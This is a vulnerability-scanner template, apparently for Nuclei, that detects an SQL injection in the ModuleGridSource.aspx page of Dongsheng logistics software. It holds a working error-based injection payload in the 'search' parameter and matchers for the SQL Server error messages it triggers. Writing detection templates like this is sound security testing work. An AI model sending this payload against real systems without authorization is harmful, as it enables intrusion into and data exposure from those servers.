id: poc-yaml-dongshengsoft-modulegridsource-aspx-sqli
info:
  name: 东胜物流软件 ModuleGridSource.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Detects SQL injection vulnerability in 东胜物流软件's ModuleGridSource.aspx endpoint.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/Modules/ModuleGridSource.aspx?handle=list&search=name:a%')and+1<@@VERSION--"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "Microsoft SQL Server"
          - "SqlException:"
          - "ModuleGridSource.aspx"
        part: body
      - type: regex
        regex:
          - "转换成数据类型(.*?)时失败"
          - "在将(.*?)值"
        part: body
